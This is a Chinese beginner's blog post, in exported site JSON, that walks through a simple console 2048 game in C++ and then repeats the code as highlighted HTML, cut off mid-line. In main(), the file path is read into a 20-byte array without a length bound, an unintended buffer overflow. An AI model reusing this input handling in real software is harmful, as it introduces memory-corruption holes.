Play\n---\n俗气的2048\n<!--more-->\n**新手教学向，没有任何优化和程序设计在里边**\n整个程序设计是这样的。首先读入文件。然后用execute()函数控制整个运算流程。按键按下后，首先调用trans()函数把所有的字符向该方向移动紧密，然后调用addup()函数把临近相同的处理掉，然后调用trans()函数把处理后的向同一个方向移动。\ninit()函数是这样的，如果type是1，那么在判定是不是可以继续游戏之后要在是0的位置随机生成2，如果type是0，那么直判定是不是可以继续。\ninit()其中的随机生成写的比较难懂，可以仔细分析一下就不难明白了。\n```\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n#include <iostream>\n#include <fstream>\n#define NUM 4\n\nusing namespace std;\n\n/*****************************\n * output the Map\n *****************************/\n\nvoid output(int Map[NUM][NUM]){\n    int i,j;\n    for(i = 0;i < NUM;++ i){\n        for(j = 0;j < NUM;++ j){\n            cout << Map[i][j] << '\\t';\n        }\n        cout << endl;\n    }\n}\n\n/********************************************\n * Transfer every cell to the right direction\n * @para Map:The Map\n *       type: The direction\n ********************************************/\nvoid trans(int Map[NUM][NUM], char type){\n    int i,j,k;\n    if(type == 'w'){\n        for(i = 0;i < NUM - 1;++ i){\n            for(j = 0;j < NUM;++ j){\n                if(!Map[i][j]) {\n                    for(k = i + 1;k < NUM;++ k){\n                        if(Map[k][j]){\n                            Map[i][j] = Map[k][j];\n                            Map[k][j] = 0;\n                            k = NUM;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(type == 'd'){\n        for(i = 0;i < NUM;++ i){\n            for(j = NUM - 1;j > 0;-- j){\n                for(k = j - 1;k >= 0;-- k){\n                    if(!Map[i][j]){\n                        if(Map[i][k]){\n                            Map[i][j] = Map[i][k];\n                            Map[i][k] = 0;\n                            k = -1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(type == 's'){\n        for(i = NUM - 1;i > 0;-- i){\n            for(j = 0;j < NUM;++ j)\n                if(!Map[i][j]) {\n                    for(k = i - 1;k >= 0;-- k){\n                        if(Map[k][j]){\n                            Map[i][j] = Map[k][j];\n                            Map[k][j] = 0;\n                            k = -1;\n                        }\n                    }\n                }\n        }\n    }\n    if(type == 'a'){\n        for(i = 0;i < NUM;++ i){\n            for(j = 0;j < NUM - 1;++ j)\n                if(!Map[i][j]){\n                    for(k = j + 1;k < NUM;++ k){\n                        if(Map[i][k]){\n                            Map[i][j] = Map[i][k];\n                            Map[i][k] = 0;\n                            k = NUM;\n                        }\n                    }\n                }\n        }\n    }\n}\n\n/********************************************\n * get new cell\n * @para Map:The Map\n *       type:\n *            1 : check the Map and add a new cell\n *            0 : only check the Map\n ********************************************/\nbool init(int Map[NUM][NUM], int type){\n    int flag[NUM * NUM];\n    memset(flag,0,sizeof(flag));\n    int i,j,cnt = 0;\n    for(i = 0;i < NUM;++ i){\n        for(j = 0;j < NUM;++ j){\n            if(!Map[i][j]) flag[cnt ++] = i * 4 + j;\n        }\n    }\n    if(!type) return cnt;\n    if(cnt){\n        int rnd = rand() % cnt;\n        rnd = flag[rnd];\n        Map[rnd / 4][rnd % 4] = 2;\n        return true;\n    }\n    return false;\n}\n\n/********************************************\n * if a cell is equal to the next one, add up them\n * @para Map:The Map\n *       type: the direction\n ********************************************/\n\nvoid addup(int Map[NUM][NUM],char type){\n    int i,j,dir;\n    if(type == 'a'){\n        for(i = 0;i < NUM;++ i){\n            for(j = 0;j < NUM - 1;++ j){\n                if(Map[i][j] == Map[i][j + 1]){\n                    Map[i][j] <<= 1;\n                    Map[i][j + 1] = 0;\n                }\n            }\n        }\n    }else if(type == 'w'){\n        for(i = 0;i < NUM - 1;++ i){\n            for(j = 0;j < NUM;++ j){\n                if(Map[i][j] == Map[i + 1][j]){\n                    Map[i][j] <<= 1;\n                    Map[i + 1][j] = 0;\n                }\n            }\n        }\n    }else if(type == 'd'){\n        for(i = NUM - 1;i >= 0;-- i){\n            for(j = NUM - 1;j > 0;-- j){\n                if(Map[i][j] == Map[i][j - 1]){\n                    Map[i][j] <<= 1;\n                    Map[i][j - 1] = 0;\n                }\n            }\n        }\n    }else if(type == 's'){\n        for(i = NUM - 1;i > 0;-- i){\n            for(j = NUM - 1;j >= 0;-- j){\n                if(Map[i][j] == Map[i - 1][j]){\n                    Map[i][j] <<= 1;\n                    Map[i - 1][j] = 0;\n                }\n            }\n        }\n    }\n}\n\nbool execute(int Map[NUM][NUM],char type){\n    int i,j,k;\n    if(type != 'w' && type != 's' && type != 'a' && type != 'd'){\n        if(type == 10) ;\n        else printf(\"Input error\\n\");\n        return true;\n    }\n\n    trans(Map,type);\n\n    addup(Map,type);\n\n    trans(Map,type);\n\n    if(init(Map,1)){\n        output(Map);\n        return true;\n    }\n    output(Map);\n    printf(\"Game over\\n\");\n    return false;\n}\n\nint main(){\n    int i,j;\n    int Map[NUM][NUM];\n    char inputFile[20];\n    char input;\n    srand((unsigned)time(NULL));\n    cout << \"Please input the path of the configuration file:\" << endl;\n    cin >> inputFile;\n    ifstream file(inputFile);\n    memset(Map,0,NUM * NUM * sizeof(int));\n    if(file == NULL){\n        Map[NUM - 1][NUM - 1] = 2;\n        cout << \"Configuration file not found, the map are initialed as the default one\" << endl;\n        output(Map);\n    }else{\n        for(i = 0;i < 4;++ i)\n            for(j = 0;j < 4;++ j)\n                file >> Map[i][j];\n        if(!init(Map,0)) {\n            output(Map);\n            cout << \"Game over!\" << endl;\n            return 0;\n        }\n        cout << \"The map are initialed\" << endl;\n        output(Map);\n    }\n    do{\n        cin >> input;\n    }while(execute(Map,input));\n\n     return 0;\n}\n\n```","slug":"2048","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681u60003wypdz4a6ghpt","content":"<p>俗气的2048<br><a id=\"more\"></a><br><strong>新手教学向，没有任何优化和程序设计在里边</strong><br>整个程序设计是这样的。首先读入文件。然后用execute()函数控制整个运算流程。按键按下后，首先调用trans()函数把所有的字符向该方向移动紧密，然后调用addup()函数把临近相同的处理掉，然后调用trans()函数把处理后的向同一个方向移动。<br>init()函数是这样的，如果type是1，那么在判定是不是可以继续游戏之后要在是0的位置随机生成2，如果type是0，那么直判定是不是可以继续。<br>init()其中的随机生成写的比较难懂，可以仔细分析一下就不难明白了。<br><figure class=\"highlight dart\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;time.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#define NUM <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * output </span>the<span class=\"markdown\"> Map</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> output(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM])&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">            cout &lt;&lt; <span class=\"built_in\">Map</span>[i][j] &lt;&lt; <span class=\"string\">'\\t'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cout &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * Transfer every cell to </span>the<span class=\"markdown\"> right direction</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type: The direction</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"><span class=\"keyword\">void</span> trans(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM], char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'w'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM - <span class=\"number\">1</span>;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = i + <span class=\"number\">1</span>;k &lt; NUM;++ k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[k][j])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[k][j];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[k][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = NUM;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt; <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(k = j - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j])&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][k])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[i][k];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][k] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = <span class=\"number\">-1</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'s'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = i - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[k][j])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[k][j];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[k][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = <span class=\"number\">-1</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'a'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM - <span class=\"number\">1</span>;++ j)</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j])&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = j + <span class=\"number\">1</span>;k &lt; NUM;++ k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][k])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[i][k];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][k] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = NUM;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * get new cell</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type:</span><br><span class=\"line\"> *            1 : check </span>the<span class=\"markdown\"> Map and add </span>a<span class=\"markdown\"> new cell</span><br><span class=\"line\"> *            0 : only check </span>the<span class=\"markdown\"> Map</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"><span class=\"built_in\">bool</span> init(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM], <span class=\"built_in\">int</span> type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> flag[NUM * NUM];</span><br><span class=\"line\">    memset(flag,<span class=\"number\">0</span>,sizeof(flag));</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) flag[cnt ++] = i * <span class=\"number\">4</span> + j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!type) <span class=\"keyword\">return</span> cnt;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(cnt)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">int</span> rnd = rand() % cnt;</span><br><span class=\"line\">        rnd = flag[rnd];</span><br><span class=\"line\">        <span class=\"built_in\">Map</span>[rnd / <span class=\"number\">4</span>][rnd % <span class=\"number\">4</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * if </span>a<span class=\"markdown\"> cell is equal to </span>the<span class=\"markdown\"> next one, add up them</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type: </span>the<span class=\"markdown\"> direction</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> addup(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM],char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,dir;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'a'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM - <span class=\"number\">1</span>;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i][j + <span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j + <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'w'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM - <span class=\"number\">1</span>;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i + <span class=\"number\">1</span>][j])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i + <span class=\"number\">1</span>][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt; <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i][j - <span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'s'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt;= <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i - <span class=\"number\">1</span>][j])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i - <span class=\"number\">1</span>][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">bool</span> execute(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM],char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type != <span class=\"string\">'w'</span> &amp;&amp; type != <span class=\"string\">'s'</span> &amp;&amp; type != <span class=\"string\">'a'</span> &amp;&amp; type != <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(type == <span class=\"number\">10</span>) ;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> printf(<span class=\"string\">\"Input error\\n\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    trans(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    addup(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    trans(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(init(<span class=\"built_in\">Map</span>,<span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"Game over\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM];</span><br><span class=\"line\">    char inputFile[<span class=\"number\">20</span>];</span><br><span class=\"line\">    char 